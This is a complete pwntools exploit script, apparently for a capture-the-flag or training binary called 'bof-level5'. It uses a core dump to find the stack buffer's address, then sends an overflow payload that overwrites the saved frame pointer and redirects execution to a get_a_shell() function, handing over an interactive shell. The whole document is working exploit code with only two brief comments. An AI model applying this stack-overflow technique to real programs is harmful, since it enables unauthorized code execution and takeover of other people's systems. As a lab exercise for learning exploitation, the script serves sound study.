from pwn import *

p = process('./bof-level5')

context.terminal = ['tmux', 'splitw', '-h']

e = ELF('./bof-level5')

get_a_shell = e.symbols['get_a_shell']

print(hex(get_a_shell))

buf = "A" *0x84

if not os.path.exists('core'):
        p.sendline(buf)
        p.wait()
c = Core('./core')

buffer_addr = c.stack.find(buf)
print(hex(buffer_addr))

# construct a new buffer that overwrites saved ebp and then returns to
# get_a_shell().
buf = "AAAA" + p32(get_a_shell) + "A" * (0x80 - 8) + p32(buffer_addr)

p.sendline(buf)

# enjoy!
p.interactive()